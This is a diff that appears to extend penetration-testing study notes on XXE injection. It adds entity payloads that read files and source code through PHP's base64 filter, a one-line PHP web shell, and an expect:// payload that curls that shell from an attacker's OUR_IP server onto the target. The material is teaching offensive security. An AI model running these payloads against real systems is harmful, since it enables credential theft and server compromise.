@@ -34,3 +34,45 @@ To see if we can define external XML entities, we can add the SYSTEM keyword and
 This enables us to read the content of sensitive files, like configuration files that may contain passwords or other sensitive files like an id_rsa SSH key of a specific user, which may grant us access to the back-end server.
 
 *Note: In certain Java web applications, we may also be able to specify a directory instead of a file, and we will get a directory listing instead, which can be useful for locating sensitive files.*
+
+### Reading Source Code
+This would allow us to perform a Whitebox Penetration Test to unveil more vulnerabilities in the web application, or reveal secret configurations like database passwords or API keys. <br>
+If the file we are referencing is not in a proper XML format, it fails to be referenced as an external XML entity, so this one probably fails:
+```
+<!DOCTYPE email [
+  <!ENTITY company SYSTEM "file://index.php">
+]>
+```
+If a file contains some of XML's special characters (e.g. </>/&), it would break the external entity reference and not be used for the reference. Furthermore, we cannot read any binary data, as it would also not conform to the XML format. <br>
+However, PHP provides wrapper filters that allow us to base64 encode certain resources 'including files', in which case the final base64 output should not break the XML format. To do so, instead of using file:// as our reference, we will use PHP's php://filter/ wrapper. With this filter, we can specify the convert.base64-encode encoder as our filter, and then add an input resource (e.g. resource=index.php), as follows:
+```
+<!DOCTYPE email [
+  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
+]>
+```
+*Note: This trick only works with PHP web applications.*
+
+### Remote Code Execution with XXE
+The easiest method would be to look for ssh keys, or attempt to utilize a hash stealing trick in Windows-based web applications, by making a call to our server. If these do not work, we may still be able to execute commands on PHP-based web applications through the PHP://expect filter, though this requires the PHP expect module to be installed and enabled. <br>
+The most efficient method to turn XXE into RCE is by fetching a web shell from our server and writing it to the web app, and then we can interact with it to execute commands. To do so, we can start by writing a basic PHP web shell and starting a python web server, as follows:
+```
+echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
+```
+```
+sudo python3 -m http.server 80
+```
+Now, we can use the following XML code to execute a curl command that downloads our web shell into the remote server:
+```
+<?xml version="1.0"?>
+<!DOCTYPE email [
+  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
+]>
+<root>
+<name></name>
+<tel></tel>
+<email>&company;</email>
+<message></message>
+</root>
+```
+
+ 
